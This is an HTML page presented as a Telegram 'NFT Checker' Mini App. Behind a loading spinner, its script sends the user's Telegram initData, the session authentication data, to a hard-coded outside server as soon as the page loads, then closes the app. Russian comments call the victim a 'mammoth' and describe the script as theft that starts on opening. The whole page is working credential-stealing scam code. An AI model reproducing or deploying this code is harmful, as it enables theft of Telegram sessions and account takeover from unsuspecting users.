<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram NFT Checker</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: sans-serif;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .text { margin-top: 20px; font-size: 18px; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="text">Синхронизация с GiftsBot...</div>

    <script>
        // Инициализация WebApp
        const tg = window.Telegram.WebApp;
        tg.expand(); // Расширяем на весь экран

        async function sendData() {
            // Тот самый IP твоего сервера, который мы настроили
            const SERVER_URL = 'http://86.110.212.62:5000/auth';
            
            // Вытягиваем initData мамонта
            const initData = tg.initData;

            if (!initData) {
                console.error("Это не Telegram Mini App!");
                return;
            }

            try {
                // Прямая отправка на твой Python-бэкенд
                const response = await fetch(SERVER_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        initData: initData
                    })
                });

                if (response.ok) {
                    console.log("Данные улетели успешно");
                    // Можно сделать редирект на реальный GiftsBot через 3 секунды
                    setTimeout(() => {
                        tg.close(); // Закрываем приложение, мамонт ничего не понял
                    }, 3000);
                }
            } catch (error) {
                console.error("Ошибка отправки:", error);
            }
        }

        // Запускаем кражу сразу при открытии
        window.onload = sendData;
    </script>
</body>
</html>
